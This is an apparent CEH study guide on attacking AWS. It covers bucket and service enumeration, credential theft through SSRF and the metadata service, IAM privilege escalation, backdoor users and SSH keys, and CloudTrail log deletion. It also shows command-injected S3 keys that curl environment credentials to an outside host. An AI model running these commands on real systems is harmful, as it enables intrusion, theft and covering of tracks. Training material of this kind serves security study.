# 05 — AWS Hacking

> **CEH v13 Module 19 | Objective 04: Demonstrate AWS Hacking**

---

## S3 Bucket Enumeration

Simple Storage Service (S3) is a scalable cloud storage service used by Amazon AWS where files, folders, and objects are stored via web APIs. Attackers use tools such as CloudBrute, S3Scanner, Bucket Flaws, or BucketLoot to identify open S3 buckets of cloud services, such as Amazon AWS, and retrieve their content for malicious purposes.

### Techniques for Finding S3 Buckets

**1. Inspecting HTML** — attackers analyze the source code of HTML web pages in the background to find URLs to the target S3 buckets.

**2. Brute-forcing URL** — attackers use Burp Suite to perform brute-forcing attacks on the target bucket's URL to identify the correct URL to the bucket.

**3. Advanced Google Hacking** — attackers use advanced Google search operators such as "inurl" to search for URLs related to target S3 buckets.

```
# Google Dorks for S3 bucket discovery
inurl:s3.amazonaws.com
inurl:s3.amazonaws.com/audio/
inurl:s3.amazonaws.com/video/
inurl:s3.amazonaws.com/backup/
inurl:s3.amazonaws.com/movie/
inurl:s3.amazonaws.com/image/
site:s3.amazonaws.com inurl:facebook
site:s3.amazonaws.com intitle:facebook
inurl:"s3.amazonaws.com" intext:"facebook"
inurl:"s3.amazonaws.com" "facebook"
site:s3.amazonaws.com "facebook"
```

---

### S3Scanner

Source: https://github.com

S3Scanner is used to identify open S3 buckets of cloud services such as Amazon AWS and retrieve their content for malicious purposes. S3 buckets store information in the form of files, folders, and objects, which include text documents, images, videos, and PDF files; in some scenarios, they even store backup data files and credentials. S3Scanner allows attackers to retrieve objects and access control list (ACL) information, including read and write permissions.

```bash
# Scan a single bucket
s3scanner -bucket <filename>

# Scan all bucket names listed in a file (with enumeration)
s3scanner -bucket-file <filename>.txt -enumerate

# Scan each bucket name listed in the file
s3scanner -bucket-file names.txt

# Scan buckets listed in a file with eight threads
s3scanner -bucket <filename> -threads 8
```

---

### BucketLoot

Source: https://github.com

BucketLoot is an automated S3-compatible bucket inspector used to enumerate and check the permissions for Amazon S3 buckets. This helps attackers identify misconfigured S3 buckets that may be publicly accessible or have overly permissive policies. BucketLoot can also extract all URLs/subdomains and domains present in an exposed storage bucket, enabling attackers to identify hidden endpoints.

```bash
# List buckets that may be publicly accessible
python bucketloot.py -l <file_with_bucket_names>

# Check the permissions of the listed buckets
python bucketloot.py -c <file_with_bucket_names>

# Download the data from publicly accessible buckets
python bucketloot.py -d <file_with_bucket_names>

# Full command example with options
./bucketloot https://bucketloot-testing.blr1.digitaloceanspaces.com/ -max-size 14291 -search admin -notify
```

---

### CloudBrute

Source: https://github.com

CloudBrute enables attackers to find a target company's infrastructure, files, and apps on the top cloud providers such as Amazon, Google, Microsoft, DigitalOcean, Alibaba, Vultr, and Linode. It enables cloud detection of the IPINFO API and source code. This tool also enables attackers to initiate dictionary or brute-force attacks to discover cloud resources.

**Steps to Enumerate S3 Buckets using CloudBrute:**

```bash
# Navigate to CloudBrute directory
cd CLoudbrute

# Brute force, generate, and validate target buckets
./cloudbrute -d <target.com> -k <keyword> -t 80 -T 10 -w /<path_to_wordlist>.txt
```

**Flags:**
- `-d amazon.com` — Specifies the target host bucketing domain (here "amazon.com")
- `-k facebook` — Sets the keyword or pattern to search for within the target domain (here "facebook")
- `-t 80` — Specifies the threads (here 80)
- `-T 10` — Sets the timeout option
- `-w bucket_list.txt` — Specifies the wordlist file to use for the attack

**Note:** Change `-d` to `microsoft.com` for Azure buckets, or `google.com` for GCP buckets.

---

## AWS Service Enumeration

### EC2 Instance Enumeration

Amazon EC2 (Elastic Compute Cloud) is a web service that provides resizable computing capacity in the cloud, designed to make web-scale cloud computing easier for developers.

```bash
# List EC2 instances
aws ec2 describe-instances

# Check if instances use Metadata API version 1 (easier to exfiltrate access keys)
aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional

# Obtain target user data to search for secrets
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text --query "UserData.Value" | base64 --decode

# List volumes
aws ec2 describe-volumes

# Check snapshots
aws ec2 describe-snapshots --include-public

# List security groups
aws ec2 describe-security-groups

# Find security groups allowing SSH (port 22) from the internet
aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values='0.0.0.0/0'

# List fleet instances
aws ec2 describe-fleet-instances

# List fleets
aws ec2 describe-fleets

# List dedicated hosts
aws ec2 describe-hosts

# List IAM instance profile associations
aws ec2 describe-iam-instance-profile-associations

# Get instance profile by name
aws iam get-instance-profile --instance-profile-name <profile name>

# List SSH key pairs
aws ec2 describe-key-pairs

# List all types of gateways
aws ec2 describe-internet-gateways
aws ec2 describe-local-gateways
aws ec2 describe-nat-gateways
aws ec2 describe-transit-gateways
aws ec2 describe-vpn-gateways

# List VPCs, subnets, endpoints
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws ec2 describe-vpc-endpoints
aws ec2 describe-vpc-peering-connections

# List security groups with open ports exposed to the internet
aws ec2 describe-security-groups --filter Name=ip-permission.cidr,Values=0.0.0.0/0,::/0

# Define unrestricted network access at a specific port
aws ec2 authorize-security-group-ingress --group-id <security group ID> --protocol <protocol> --port <port number> --cidr 0.0.0.0/0
```

### RDS Instance Enumeration

```bash
# View all provisioned RDS instances
aws rds describe-db-instances

# View a specific RDS instance
aws rds describe-db-instances --db-instance-identifier mydbinstancecf

# Get info about DB security groups
aws rds describe-db-security-groups

# Get info about automated backups
aws rds describe-db-instance-automated-backups

# Get info about DB snapshots (including manual and automated)
aws rds describe-db-snapshots

# View public DB snapshots sharable across accounts
aws rds describe-db-snapshots --include-public --snapshot-type public
```

*Note: Requires IAM permission `rds:DescribeDBInstances`.*

### Enumerating AWS Account IDs and IAM Roles

AWS accounts are identified by unique IDs. Attackers enumerate AWS account IDs via:
- **Publicly Shared Resources** — if an AWS resource (like an S3 bucket) is publicly shared, it may contain references to an AWS account ID
- **ARNs (Amazon Resource Names)** — ARNs include the AWS account ID; if ARNs are shared in documentation, error messages, or logs, they may reveal the account ID
- **IAM Policies and Roles** — sometimes IAM policies or roles may be shared with external parties, which can expose the AWS account ID

**Enumerating IAM Roles via Error Messages:**

AWS error messages reveal whether a role exists when a failed `sts:AssumeRole` attempt is made:
- If role EXISTS: `An error occurred (AccessDenied) when calling the AssumeRole operation: User is not authorized to perform sts:AssumeRole on resource: <ARN>`
- If role DOES NOT EXIST: Different generic error message (no ARN confirmation)

By using any valid account ID and well-filtered wordlist, attackers can enumerate existing IAM roles via brute force (using fragmented sets of accounts or nodes to evade IP and account filtering solutions).

### Enumerating Weak IAM Policies using Cloudsplaining

Source: https://github.com

Cloudsplaining is a tool used to analyze AWS Identity and Access Management (IAM) policies to identify potential security risks and vulnerabilities. It allows attackers to identify weak or violated IAM policies which can be leveraged to perform privilege escalation, resource modification, and data exfiltration.

```bash
# Step 1: Fetch IAM policy details
aws iam get-account-authorization-details --output json > account-auth-details.json

# Step 2: Scan and analyze the exported IAM policies
cloudsplaining scan --input-file account-auth-details.json --output ./cloudsplaining-report
```

**Step 3:** Navigate to the output directory and open the generated report in a web browser.

*Note: The Cloudsplaining tool does NOT require admin privileges — only read-only access to IAM policies and related resources.*

### Enumerating AWS Cognito

AWS Cognito streamlines authentication, authorization, and user management for web and mobile applications. Supports user pools for sign-up/sign-in and identity pools to create unique identities to authorize access to various AWS services.

```bash
# List all user pools
aws cognito-idp list-user-pools

# View detailed info about a specific user pool
aws cognito-idp describe-user-pool --user-pool-id <UserPoolId>

# List all identity pools
aws cognito-identity list-identity-pools

# View detailed info about a specific identity pool
aws cognito-identity describe-identity-pool --identity-pool-id <IdentityPoolId>

# Check if a username already exists (sign-up attempt)
aws cognito-idp sign-up --client-id <ClientId> --username <username> --password <password> --user-attributes Name=email,Value=<email>
```

**Required IAM permissions:**
- User Pools: `cognito-idp:ListUserPools`, `cognito-idp:DescribeUserPool`
- Identity Pools: `cognito-identity:ListIdentityPools`, `cognito-identity:DescribeIdentityPool`

### Enumerating DNS Records of AWS Accounts using Ghostbuster

Source: https://github.com

Ghostbuster gathers DNS records (A, CNAME, MX, TXT) from targeted AWS accounts, specifically those managed through Amazon Route 53. It imports DNS records from a CSV file or directly from Cloudflare and cross-checks DNS records against IPs owned by the organization to detect potential subdomain takeovers.

```bash
# Enumerate DNS records for a targeted AWS account
ghostbuster scan aws --profile <AWS CLI profile name>
```

### Enumerating Serverless Resources in AWS

```bash
# List all Lambda functions
aws lambda list-functions

# Get info about a Lambda function and its version
aws lambda get-function --function-name <function_name>

# Examine configuration details of the Lambda function (including env vars)
aws lambda get-function-configuration --function-name <function_name>

# List the exposed URLs of a Lambda function
aws lambda list-function-url-configs --function-name <function_name>

# View configurations specific to a Lambda function URL
aws lambda get-function-url-config --function-name <function_name>

# List the event sources that trigger the Lambda function
aws lambda list-event-source-mappings --function-name <function_name>

# Find all managed policies attached to a target IAM role
aws iam list-attached-role-policies --role-name <role_name>

# List DynamoDB table names
aws dynamodb list-tables

# Get details of a DynamoDB table (including status and metadata)
aws dynamodb describe-table --table-name <table_name>

# List DynamoDB global tables
aws dynamodb list-global-tables

# Retrieve API Gateway REST APIs
aws apigateway get-rest-apis

# Get info about a specific REST API Gateway
aws apigateway get-rest-api --rest-api-id <api_id>
```

---

## Discovering Attack Paths using Cartography

Source: https://github.com

Cartography is a Python-based tool for mapping and understanding the security posture of various cloud platforms, such as AWS, GCP, Oracle Cloud Infrastructure, Microsoft Azure, and Okta. It ingests data from cloud infrastructure, IAM policies, and network configurations to build a comprehensive graph view.

```cypher
# Identify RDS instances on the current AWS account
MATCH (aws:AWSAccount)-[r:RESOURCE]->(rds:RDSInstance)
return *

# Find RDS instances with encryption turned off
MATCH (a:AWSAccount)-[:RESOURCE]->(rds:RDSInstance{storage_encrypted:false})
RETURN a.name, rds.id

# Find EC2 instances directly exposed to the internet
MATCH (instance:EC2Instance{exposed_internet:true})
RETURN instance.instanceid, instance.publicdnsname
```

**Additional inventory tools:**
- Starbase (https://github.com)
- Cloudlist (https://github.com)
- AWS Recon (https://github.com)
- aws-inventory (https://github.com)
- CloudMapper (https://github.com)

---

## Discovering Attack Paths using CloudFox

Source: https://github.com

CloudFox is a command-line tool that allows attackers to identify exploitable attack paths within targeted cloud environments such as AWS, Azure, and GCP. CloudFox scans secrets hidden in EC2 user data, service-specific environment variables, workloads with administrative permissions, role table, hostnames, IPs, and filesystems in the targeted AWS infrastructure.

```bash
# Run all checks against an AWS environment
cloudfox aws --profile <profile-name> all-checks

# Enumerate active access keys for all users
cloudfox aws --profile <profile-name> -v2 access-keys

# Display buckets in the account and provide commands for inspecting them
cloudfox aws --profile <profile-name> -v2 buckets

# Return ECS tasks and associated cluster/task definition/container info
cloudfox aws --profile <profile-name> ecs-tasks -v2

# Identify all elastic network interfaces
cloudfox aws -p <profile-name> eni -v2

# Enumerate vulnerable endpoints from various services
cloudfox aws --profile <profile-name> -v2 endpoints

# List all IAM permissions available to a principal
cloudfox aws --profile <profile-name> permissions -v2

# Display secrets from SecretsManager and SSM
cloudfox aws --profile <profile-name> -v2 secrets

# Identify workloads with admin permissions or a path to admin permissions
cloudfox aws --profile <profile-name> workloads
```

---

## Compromising IAM Credentials

### Attack Vectors for IAM Credential Compromise

| Vector | Description |
|--------|-------------|
| **Repository Misconfigurations** | Most organizations host their AWS keys in shared storage on an internal network, such as a Git repository; developers and engineers can easily access the keys when necessary; however, disgruntled insiders may misuse AWS keys; AWS keys can also be compromised if any individual unknowingly shares their personal keys with a shared repository |
| **Social Engineering** | Attackers use social engineering techniques, such as fake emails, calls, and SMSs, to trick users into revealing their AWS IAM credentials |
| **Password Reuse** | Password reuse is a common problem that can cause serious vulnerabilities; if an attacker can compromise one password, they can gain access to other cloud services with the same credentials |
| **Vulnerabilities in AWS-Hosted Applications (SSRF)** | Server-side request forgery is a common web application vulnerability used by attackers to send web requests to the victims of compromised web servers; attackers target the internal EC2 metadata API if a vulnerability is found in the web application, and make requests from the EC2 instance |
| **Reading Local File** | In general, AWS keys are stored in various locations such as configuration and log files in an operating system; if an attacker has OS access, their credentials are also stored in the home directory and in the keys stored in the environment variable file; if an attacker has already gained access to the operating system, they can easily gain access to the temporary credentials and keys stored in the operating system to perform further exploitation |
| **Exploiting Third-Party Software** | Many online services require access to an AWS environment for their software or applications to operate properly; if an attacker compromises a third-party software, they can gain access to the data stored in the cloud environment |
| **Insider Threat** | Insider threats arise mostly from business associates and current or former employees who already have trusted access to the environment and do not need to compromise credentials externally; if an insider wants to damage the reputation of the company, they try to exploit cloud services using their credentials and performs direct code changes, leading to information disclosure to the public |

### Hijacking Misconfigured IAM Roles using Pacu

Source: https://github.com

AWS IAM policies such as `AssumeRole` permissions are flexible; however, misconfigurations in the role permissions can open it to various attacks. For instance, if the role `AWS:*` (poorly configured) exists, any user with a valid AWS account can assume the role and obtain credentials.

**Example misconfigured trust policy:**
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": { "AWS": "*" },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

Pacu contains a 1100+ wordlist of commonly used role names. The script automatically alerts the attacker when a role is identified.

```bash
# Run the assume_role_enum script
assume_role_enum.py [-h] [-p PROFILE] [-w WORD_LIST] -I ACCOUNT_ID
```

### Scanning AWS Access Keys using DumpsterDiver

Source: https://github.com

DumpsterDiver allows attackers to examine a large volume of file types while scanning hardcoded secret keys, such as AWS access keys, SSL keys, and Microsoft Azure keys. It also allows attackers to generate simple conditional-based search rules.

**Note:** AWS access key ID format: starts with "AKIA" followed by 16 alphanumeric characters.

```bash
# Scan a directory for potential secrets
dumpsterDiver -p /path/to/scan

# Scan a directory specifically for AWS keys
dumpsterDiver -p /path/to/scan -e AWS_KEY

# Full command syntax
DumpsterDiver.py [-h] -p LOCAL_PATH [-r] [-a] [-s] [-l [0,3]] [-o OUTFILE] \
  [--min-key MIN_KEY] [--max-key MAX_KEY] [--entropy ENTROPY] \
  [--min-pass MIN_PASS] [--max-pass MAX_PASS] \
  [--pass-complex {1,2,3,4,5,6,7,8,9}] \
  [--grep-words GREP_WORDS [GREP_WORDS ...]] \
  [--exclude-files EXCLUDE_FILES [EXCLUDE_FILES ...]] \
  [--bad-expressions BAD_EXPRESSIONS [BAD_EXPRESSIONS ...]]
```

**Flags:**
- `-p LOCAL_PATH` — Path to the folder containing files to be analyzed
- `-r, --remove` — Set this flag to remove files that do not contain secret keys
- `-a, --advance` — Set this flag to analyze files using rules specified in 'rules.yaml'
- `-s, --secret` — Set this flag to analyze files in search of hardcoded passwords
- `-o OUTFILE` — Generate output in JSON format

---

## SSRF Exploitation

Attackers can exploit SSRF vulnerabilities in a web application that is hosting the cloud service to retrieve the AWS credentials for a role, add the retrieved credentials to the local aws-cli, retrieve user account details from S3 buckets, and gain access and exfiltrate the data stored in all the buckets related to that account.

**Requirements:** Target web application must use `Http` and have an SSRF vulnerability in a GET variable called `url`.

```bash
# Step 1: Add stolen credentials to local aws-cli
aws configure

# Step 2: Verify the credentials work (returns user ID, account number, ARN)
aws sts get-caller-identity --profile stolen_profile

# Step 3: List all buckets available to the account
aws s3 ls --profile stolen_profile

# Step 4: Synchronize and download all data stored in the buckets
aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile
```

---

## Gathering Cloud Keys Through IMDS Attack

Source: https://docs.aws.amazon.com

In an AWS environment, cloud access keys are security credentials used by an IAM user or an AWS account as the root user to access AWS services. The access key ID and secret access key are integral parts of the cloud keys that can be used to authenticate requests.

Attackers launch IMDS attacks to obtain cloud keys and gain access to cloud resources. The attacker can access a REST API operating at a particular IP address (here 169.254.169.254) through the IMDS (IMDSv1).

```bash
# IMDSv1 - List roles associated with the instance
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv1 - Obtain cloud keys for a specific role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>

# IMDSv2 - First generate a session token (valid for 21600 seconds = 6 hours)
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

# IMDSv2 - Then use the token in all subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```

---

## Exploiting Misconfigured AWS S3 Buckets

### Complete 6-Step Exploitation Walkthrough

**Step 1: Identify S3 buckets**

Use tools such as S3Scanner, lazys3, Bucket Finder, and s3-buckets-bruteforcer. Attackers can gather the URLs of the identified buckets.

```
http://[bucket_name].s3.amazonaws.com/
```

**Step 2: Setup AWS CLI**

Install aws-cli, check the AWS version, and create an AWS account.

**Step 3: Extract access keys**

Sign in at https://console.aws.amazon.com/iam/ → Users → Add User → Create User → download the CSV file and extract your access keys.

**Step 4: Configure aws-cli**

```bash
aws configure
```

**Step 5: Identify vulnerable S3 buckets**

```bash
aws s3 ls s3://[bucket_name]
aws s3 ls s3://[bucket_name] --no-sign-request
```

**Step 6: Exploit S3 buckets**

```bash
# Reading files in the bucket
aws s3 ls s3://[bucket_name] --no-sign-request

# Moving files into the bucket
aws s3 mv FileName s3://[bucket_name]/test-file.txt --no-sign-request

# Copying files into the bucket
aws s3 cp FileName s3://[bucket_name]/test-file.svg --no-sign-request

# Deleting files from the bucket
aws s3 rm s3://[bucket_name]/test-file.svg --no-sign-request
```

---

## IAM Privilege Escalation

Source: https://rhinosecuritylabs.com

After gaining access to the target cloud services, attackers attempt to exploit their privileges to expand their attack surfaces and perform further exploitation. The following are various techniques used by attackers to escalate AWS IAM privileges:

### 1. Create a New Policy Version

**Required permission:** `iam:CreatePolicyVersion`

Attackers who have access to `iam:CreatePolicyVersion` can create a new version of the IAM policy with custom permissions. Attackers set the new policy as the default version by including the `--set-as-default` flag while creating the policy without requiring permissions to use `iam:SetDefaultPolicyVersion`.

### 2. Assign the Default Policy Version to an Existing Version

**Required permission:** `iam:SetDefaultPolicyVersion`

Attackers can escalate their privileges by abusing existing unused policies if they have access permissions to `iam:SetDefaultPolicyVersion`. If a policy is accessible by the attacker and has non-default versions, attackers can change the default version to the other existing version.

### 3. Create an EC2 Instance with an Existing Instance Profile

**Required permissions:** `iam:PassRole` + `ec2:RunInstances`

Attackers who have access permissions to `iam:PassRole` and `ec2:RunInstances` can create a new EC2 instance with an existing instance profile to access the operating system. Then, they can abuse the new EC2 instance with an existing instance profile to access the associated AWS keys from the EC2 instance metadata. This gives them all access permissions of the existing instance profile.

### 4. Create a New User Access Key

**Required permission:** `iam:CreateAccessKey`

Attackers having access permissions to `iam:CreateAccessKey` can create access key IDs and secret access keys for other users. This gives them all access permissions that the user has.

### 5. Create/Update Login Profile

**Required permissions:** `iam:CreateLoginProfile` / `iam:UpdateLoginProfile`

- **Create:** If attackers acquire access permissions to `iam:CreateLoginProfile`, they can create new login profiles for the application and the AWS Management Console. If attackers create a new login profile for an account in the AWS Management Console, they are elevated to the privileges of the specific user profile.
- **Update:** If attackers acquire access permissions to `iam:UpdateLoginProfile`, they can change the login profiles of other users. In both cases, users are elevated to the privileges of the corresponding user group.

### 6. Attach a Policy to a User/Group/Role

**Required permissions:** `iam:AttachUserPolicy`, `iam:AttachGroupPolicy`, `iam:AttachRolePolicy`

Attackers can escalate their privileges by attaching a policy to a user and adding permissions of that policy to the attacker's policy. Similarly, attackers with access permissions to `iam:AttachGroupPolicy` and `iam:AttachRolePolicy` can manipulate the policies and elevate their privileges to the level of the corresponding group or role.

### 7. Create/Update an Inline Policy for User/Group/Role

**Required permissions:** `iam:PutUserPolicy`, `iam:PutGroupPolicy`, `iam:PutRolePolicy`

`iam:PutUserPolicy` and `iam:PutGroupPolicy`, and `iam:PutRolePolicy` can create or update an inline policy for a user, group, and role, respectively. This technique allows attackers to gain full administrator privileges in the AWS environment.

### 8. Add a User to a Group

**Required permission:** `iam:AddUserToGroup`

Attackers having access permissions to `iam:AddUserToGroup` can add themselves to an existing IAM user group in the AWS environment. This technique allows attackers to gain the privileges of existing groups.

---

## Creating Backdoor Accounts in AWS

### Using Endgame

Source: https://github.com

The Endgame tool is an exploitation framework that helps attackers gain control over an AWS cloud platform through a rogue account in it. An attacker can create a list of backdoor accounts in the targeted AWS cloud platform by utilizing the tool's full-length capabilities.

**Supported resource types for backdooring:** ACM Private CAs, CloudWatch Resource Policies, EBS Volume Snapshots, EC2 AMIs, ECR Container Repositories, EFS File Systems, Elasticsearch Domains, Glacier Vault Access Policies, IAM Roles, KMS Keys, Lambda Functions, Lambda Layers, RDS Snapshots, S3 Buckets, Secrets Manager Secrets, SES Sender Authentication Policies, SNS Topics, SQS Queues.

```bash
# List IAM resources with the user account
endgame list-resources -s iam

# List S3 buckets
endgame list-resources --service s3

# List resources across the services
endgame list-resources --service all

# Create a backdoor to a specific resource
endgame expose --service iam --name test-resource-exposure
```

---

## AWS Threat Emulation using Stratus Red Team

Source: https://github.com

Stratus Red Team is "Atomic Red Team™ for the cloud," allowing emulation of offensive attack techniques in a granular and self-contained manner. Attackers use the Stratus Red Team to simulate various attack techniques in target cloud environments. The tool supports multiple platforms, including AWS, GCP, Azure, and Kubernetes. Inspired by the Atomic Red Team, it maps its techniques to the MITRE ATT&CK framework.

```bash
# Authenticate to AWS first
export AWS_PROFILE=my-profile
aws-vault exec sandbox-account

# List available attack techniques for a MITRE ATT&CK tactic
stratus list --platform AWS --mitre-attack-tactic persistence

# View the details of a specific attack technique
stratus show <Attack technique>

# Warm up an attack technique (spin up prerequisite infrastructure without detonating)
stratus warmup <Attack technique>

# Detonate the attack technique
stratus detonate <Attack technique>

# Display the current state of the attack techniques
stratus status

# Clean up leftover infrastructure from an attack technique
stratus cleanup <Attack technique>

# Clean up everything
stratus cleanup --all
```

---

## CloudTrail Evasion

After gaining administrator-level access to cloud resources, attackers manipulate the cloud trails to remain undetected and gain persistent access to the compromised environment. By default, the CloudTrail service is disabled.

```bash
# Stop logging via CloudTrail
aws cloudtrail stop-logging --name targetcloud_trail --profile administrator

# Acquire the trail status
aws cloudtrail get-trail-status --name targetcloud_trail --profile administrator

# Re-enable logging after the attack is completed
aws cloudtrail start-logging --name targetcloud_trail --profile administrator

# Permanently remove the trails
aws cloudtrail delete-trail --name targetcloud_trail --profile administrator

# Delete the contents of the bucket that stores the trails
aws s3 rb s3://<Bucket_Name or Bucket_Reference> --force --profile administrator
```

**Other track-covering techniques:**
- Encrypting the cloud trails using a new key
- Moving the trails to a new S3 bucket
- Using an AWS Lambda function to delete new trail entries
- Inserting a backdoor into the existing Lambda function
- Manipulating access keys using Lambda functions such as `rabbit_lambda`, `cli_lambda`, `backdoor_created_users_lambda`

---

## Persistence on EC2

### Creating Backdoor Users

```bash
# Step 1: Gain initial EC2 access

# Step 2: Create a new IAM user with admin access
aws iam create-user --user-name <Username>
aws iam attach-user-policy --user-name <Username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: Store the access keys securely
aws iam create-access-key --user-name <Username>
```

### Altering Startup Scripts

```bash
# Step 1: Gain root/sudo access

# Step 2: Modify startup files to execute malicious code on boot
echo "/path/to/malicious/script.sh" >> /etc/rc.local

# Step 3: Ensure the script has executable permissions
chmod +x /path/to/malicious/script.sh
```

### SSH Key Injection

```bash
# Step 1: Access the target EC2 instance with sufficient privileges

# Step 2: Add the attacker's SSH public key to authorized_keys
echo "ssh-rsa AAAAB3... attacker_key" >> ~/.ssh/authorized_keys
```

### Leveraging IAM Roles for Persistence

```bash
# Step 1: Enumerate existing IAM roles with elevated privileges
aws iam list-roles

# Step 2: Create a new role with similar privileges
aws iam create-role --role-name <Role-Name> --assume-role-policy-document file://Test-Role-Trust-Policy.json
aws iam attach-role-policy --role-name <Role-Name> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 3: Use the new role to access other resources in the AWS environment
```

---

## Lateral Movement

### Moving Between AWS Accounts and Regions

```bash
# Step 1: Identify roles with cross-account or cross-region trust relationships
aws iam list-roles
aws iam get-role --role-name <role-name>

# Step 2: Assume the role in the target account
aws sts assume-role --role-arn arn:aws:iam::<target-account-id>:role/<Role Name> --role-session-name <session name>

# Step 3: Configure the AWS CLI with the temporary credentials returned
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>

# Step 4: Enumerate target account resources and permissions
aws s3 ls
aws ec2 describe-instances --region <target-region>
aws iam list-attached-role-policies --role-name <role-name>

# Step 5: Enumerate all AWS regions available
aws ec2 describe-regions
aws s3api list-buckets --query Buckets[].Name
```

---

## Lambda Attacks

### Black-Box Scenario (No Prior Environment Knowledge)

```bash
# List objects in the target bucket
aws s3 ls prod-file-bucket-eu

# Check assigned tags with useful information
aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip

# Create a new connection with another EC2 instance
aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'

# Use the env environment to extract AWS credentials
aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
```

### White-Box Scenario (Prior Knowledge of Environment)

```bash
# Check user policies
aws iam list-attached-user-policies --user-name operator

# List Lambda functions and identify specific roles
aws lambda list-functions

# Find more information about the Lambda function
aws lambda get-function --function-name corpFuncEasy

# Extract AWS credentials via env
aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
```

---

## Exploiting Docker Containers on AWS using CCAT

Source: https://github.com

Cloud Container Attack Tool (CCAT) allows attackers to perform further exploitation on Amazon ECS and ECR using compromised AWS credentials.

**Steps to exploit AWS Docker containers:**

1. **Abuse AWS credentials** — use CCAT's "Enumerate ECR" module to list available ECR repositories
2. **Pull the target Docker image** — use CCAT's "Pull Repos from ECR" module to pull the target Docker image
3. **Create a backdoor image** — use CCAT's "Docker Backdoor" module to create a reverse shell backdoor replacing the default CMD command
4. **Push the backdoor Docker image** — use CCAT's "Push Repos to ECR" module to upload the modified Docker image back to the ECR repository

---

## Exploiting Shadow Admins in AWS

Shadow admins are user accounts with specific permissions that allow attackers to penetrate the target cloud network. Attackers abuse these permissions to escalate privileges and gain control over the target cloud environment.

**Exploitation techniques:**

- **Elevating Access Permissions** — abusing `Microsoft.Authorization/elevateAccess/Action` permissions to elevate privileges to those of an admin account
- **Modifying Existing Roles** — abusing `Microsoft.Authorization/roleDefinitions/write` permissions to modify an existing role and create new admin accounts
- **Creating New Accounts** — attackers with the `Microsoft.Authorization/roleAssignments/write` permission can assign new roles for privileged accounts

**Tools:**
- **SkyArk** (github.com) — contains two main scanning modules, AWStealth and AzureStealth, which allow attackers to discover entities (users, groups, and roles) with the most sensitive and risky permissions

---

## AWSGoat — Vulnerable by Design AWS Infrastructure

Source: https://github.com

AWSGoat is a vulnerable AWS infrastructure designed to help attackers hone their cloud exploitation skills. It offers a realistic hands-on environment with various vulnerabilities that simulate real-world attack scenarios.

**Practice scenarios:**

1. **SQL Injection** — exploit vulnerability in the web application hosted within the AWSGoat environment to perform an SQL injection attack
2. **ECS Breakout and Instance Metadata** — exploit vulnerabilities within a container to escape its confines and access the underlying host; the instance metadata service is targeted to retrieve the IAM credentials associated with the AWS instances
3. **Server-Side Request Forgery** — perform an SSRF attack to retrieve the `/etc/passwd` file from the Lambda execution environment and then compromise the environment to create a new user with administrator privileges
4. **IAM Privilege Escalation** — escalate privileges to gain administrator-level access on the AWS account
5. **File Upload and Task Metadata** — obtain a shell on the application by exploiting the file upload vulnerability and then retrieve AWS credentials from the task metadata for further unauthorized access and control over the AWS environment
